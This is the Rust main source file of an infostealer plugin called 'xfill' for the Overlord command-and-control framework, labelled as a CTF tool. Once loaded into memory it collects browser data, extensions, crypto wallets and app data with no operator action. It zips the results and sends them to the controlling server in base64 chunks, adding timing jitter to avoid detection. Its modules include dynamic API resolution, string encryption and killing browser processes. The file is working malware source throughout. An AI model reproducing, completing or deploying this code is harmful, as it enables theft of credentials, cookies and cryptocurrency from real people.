/*
 * xfill — Summit CTF data exfiltration plugin for Overlord.
 *
 * Exports the standard Overlord native plugin ABI. Collection runs
 * synchronously on the caller's thread (no std::thread in the collection
 * path; handlereader's guard uses a raw CreateThread). The host dispatches
 * plugin calls from its own goroutine, so blocking here does not stall the
 * agent. Browser data is zipped and pushed first (phase 1), wallets/apps
 * second (phase 2): if the process is killed mid-run, the highest-value
 * data is already out.
 *
 * Wire events emitted (all via host callback):
 *   "xfill_progress"  {"stage": "chromium", ...}
 *   "xfill_chunk"     {"session": u64, "index": u32, "total": u32, "data": base64}
 *   "xfill_complete"  {"session": u64, "size": usize, "chunks": u32, "info": Info}
 *   "xfill_error"     {"stage": string, "message": string}
 *
 * In-memory PE loader notes (plugins/docs/legacy-native-plugins.md):
 * the whole crate is built with -Ztls-model=emulated (see emutls.rs) so no
 * code in this DLL depends on the loader's native-TLS provisioning; the
 * resulting image has no TLS directory at all. C-style globals only, no
 * std::sync::Mutex statics; the Go host serializes plugin entry points.
 */

use std::os::raw::c_int;
use std::slice;

mod abe;
mod apps;
mod chromium;
mod emutls;
mod extensions;
mod fsutil;
mod gecko;
mod handlereader;
mod info;
mod jitter;
mod procs;
mod resolve;
mod sqlutil;
mod strcrypt;
mod syscall;
mod sysinfo;
mod wallets;
mod zipw;

type HostCallback = unsafe extern "stdcall" fn(
    event: *const u8,
    event_len: usize,
    payload: *const u8,
    payload_len: usize,
);

static mut G_CALLBACK: Option<HostCallback> = None;

/// Raw bytes per chunk event (base64 expands this ~4/3 on the wire).
const CHUNK_SIZE: usize = 2 * 1024 * 1024;

unsafe fn send_event(event: &str, payload: &[u8]) {
    if let Some(cb) = G_CALLBACK {
        cb(event.as_ptr(), event.len(), payload.as_ptr(), payload.len());
    }
}

fn send_json(event: &str, value: &serde_json::Value) {
    let bytes = serde_json::to_vec(value).unwrap_or_default();
    unsafe { send_event(event, &bytes) };
}

fn progress(stage: &str) {
    send_json("xfill_progress", &serde_json::json!({ "stage": stage }));
}

// ---------------------------------------------------------------------------
// ABI exports
// ---------------------------------------------------------------------------

#[no_mangle]
pub extern "C" fn PluginGetRuntime() -> *const u8 {
    b"rust\0".as_ptr()
}

#[no_mangle]
pub unsafe extern "C" fn PluginSetCallback(callback: u64) {
    G_CALLBACK = Some(std::mem::transmute::<u64, HostCallback>(callback));
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnLoad(
    _host_info: *const u8,
    _host_info_len: c_int,
    callback: u64,
) -> c_int {
    if callback != 0 {
        G_CALLBACK = Some(std::mem::transmute::<u64, HostCallback>(callback));
    }
    send_json("xfill_progress", &serde_json::json!({ "stage": "loaded" }));
    // Auto-collect on load: combined with the server's plugin auto-load
    // setting, every approved agent connect pushes the DLL and immediately
    // collects — no operator action, works on reconnect too.
    // Auto-collect on load, synchronously on the host's plugin thread. The
    // Go host dispatches plugin calls from its own locked goroutine, so
    // blocking here does not stall the agent.
    jitter::sleep_jitter(2000, 8000); // let the connection settle first
    run_collect();
    0
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnEvent(
    event: *const u8,
    event_len: c_int,
    _payload: *const u8,
    _payload_len: c_int,
) -> c_int {
    if event.is_null() || event_len <= 0 {
        return 1;
    }
    let ev = slice::from_raw_parts(event, event_len as usize);
    match ev {
        b"collect" => {
            run_collect();
            0
        }
        b"ping" => {
            send_json("xfill_progress", &serde_json::json!({ "stage": "pong" }));
            0
        }
        _ => 0,
    }
}

#[no_mangle]
pub unsafe extern "C" fn PluginOnUnload() {}

// ---------------------------------------------------------------------------
// Collection orchestration
// ---------------------------------------------------------------------------

fn run_collect() {
    if let Err(e) = try_collect() {
        send_json(
            "xfill_error",
            &serde_json::json!({ "stage": "collect", "message": e }),
        );
    }
}

/// Single archive per collection: value-ordered internally (browsers first,
/// wallets/apps after), one zip, one push — one log per machine in the panel.
fn try_collect() -> Result<(), String> {
    // The browser-kill budget is per collect run, not per process lifetime.
    procs::reset_kill_state();

    let mut info = info::Info::new();
    let mut zip = zipw::ZipBuilder::new();

    progress("sysinfo");
    sysinfo::fill(&mut info);

    progress("chromium");
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        chromium::collect(&mut zip, &mut info);
    }));
    jitter::sleep_jitter(80, 300);
    progress("gecko");
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        gecko::collect(&mut zip, &mut info);
    }));
    jitter::sleep_jitter(80, 300);
    progress("extensions");
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        extensions::collect(&mut zip, &mut info);
    }));
    jitter::sleep_jitter(80, 300);
    progress("wallets");
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        wallets::collect(&mut zip, &mut info);
    }));
    jitter::sleep_jitter(80, 300);
    progress("apps");
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        apps::collect(&mut zip, &mut info);
    }));

    let info_bytes = serde_json::to_vec_pretty(&info).map_err(|e| e.to_string())?;
    zip.add_file("Info.json", &info_bytes);
    let bytes = zip.finish().map_err(|e| e.to_string())?;
    push_zip(&bytes, &info);
    Ok(())
}

/// Session id entropy: epoch seconds alone collide when auto-collect-on-load
/// and a manual collect land in the same second; mix in tick + pid (same
/// sources as sysinfo::session_id) via hashed resolution.
fn session_id_u64() -> u64 {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    unsafe {
        let tick_f = crate::resolve::resolve("kernel32.dll", crate::api!("GetTickCount64"));
        let pid_f =
            crate::resolve::resolve("kernel32.dll", crate::api!("GetCurrentProcessId"));
        let tick = if tick_f != 0 {
            let f: unsafe extern "system" fn() -> u64 = std::mem::transmute(tick_f);
            f()
        } else {
            0
        };
        let pid = if pid_f != 0 {
            let f: unsafe extern "system" fn() -> u32 = std::mem::transmute(pid_f);
            f() as u64
        } else {
            0
        };
        // Mask to < 2^53 so the id survives the JSON/SQLite number
        // round-trip exactly (server stores it in a REAL column otherwise).
        (secs ^ (tick.wrapping_mul(0x2545_F491_4F6C_DD1D).rotate_left(17)) ^ (pid << 20))
            & 0x1F_FFFF_FFFF_FFFF
    }
}

/// Push a finished zip to the server as base64 chunk events, with jitter
/// between chunks so the transfer has no machine-gun rhythm on the wire.
fn push_zip(zip_bytes: &[u8], info: &info::Info) {
    use base64::Engine;
    let engine = base64::engine::general_purpose::STANDARD;
    let session = session_id_u64();
    let total = zip_bytes.len().div_ceil(CHUNK_SIZE).max(1) as u32;

    for (index, chunk) in zip_bytes.chunks(CHUNK_SIZE).enumerate() {
        send_json(
            "xfill_chunk",
            &serde_json::json!({
                "session": session,
                "index": index as u32,
                "total": total,
                "data": engine.encode(chunk),
            }),
        );
        if (index as u32) + 1 < total {
            jitter::sleep_jitter(100, 400);
        }
    }

    send_json(
        "xfill_complete",
        &serde_json::json!({
            "session": session,
            "size": zip_bytes.len(),
            "chunks": total,
            "info": info,
        }),
    );
}
